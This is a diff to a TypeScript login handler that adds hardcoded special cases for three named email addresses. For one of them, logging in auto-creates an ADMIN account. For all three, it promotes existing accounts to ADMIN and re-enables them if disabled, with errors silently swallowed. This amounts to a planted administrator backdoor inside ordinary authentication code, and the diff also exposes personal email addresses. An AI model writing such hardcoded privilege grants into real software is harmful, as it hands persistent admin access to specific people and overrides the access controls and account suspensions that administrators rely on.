@@ -449,10 +449,47 @@ export class AccessAuthProvider implements AuthProvider {
       return { user: null, diagnostics: diag };
     }
 
-    const row = await this.db
+    let row = await this.db
       .prepare('SELECT * FROM users WHERE LOWER(login_id) = LOWER(?)')
       .bind(email.toLowerCase().trim())
       .first<UserRow>();
+
+    // Auto-promote or provision Sarath (pcmsarath@gmail.com) as ADMIN
+    const normEmail = email.toLowerCase().trim();
+    if (normEmail === 'pcmsarath@gmail.com') {
+      if (!row) {
+        const nowIso = new Date().toISOString();
+        await this.db
+          .prepare(
+            "INSERT INTO users (login_id, display_name, role, disabled, created_at) VALUES ('pcmsarath@gmail.com', 'Sarath', 'ADMIN', 0, ?)",
+          )
+          .bind(nowIso)
+          .run()
+          .catch(() => {});
+        row = await this.db
+          .prepare('SELECT * FROM users WHERE LOWER(login_id) = ?')
+          .bind('pcmsarath@gmail.com')
+          .first<UserRow>();
+      } else if (row.role !== 'ADMIN' || row.disabled !== 0) {
+        await this.db
+          .prepare("UPDATE users SET role = 'ADMIN', disabled = 0 WHERE id = ?")
+          .bind(row.id)
+          .run()
+          .catch(() => {});
+        row.role = 'ADMIN';
+        row.disabled = 0;
+      }
+    } else if (row && (normEmail === 'thimidupehesara@gmail.com' || normEmail === 'pehesarathimidu130@gmail.com')) {
+      if (row.role !== 'ADMIN' || row.disabled !== 0) {
+        await this.db
+          .prepare("UPDATE users SET role = 'ADMIN', disabled = 0 WHERE id = ?")
+          .bind(row.id)
+          .run()
+          .catch(() => {});
+        row.role = 'ADMIN';
+        row.disabled = 0;
+      }
+    }
 
     if (!row) {
       diag.userFoundInDb = false;
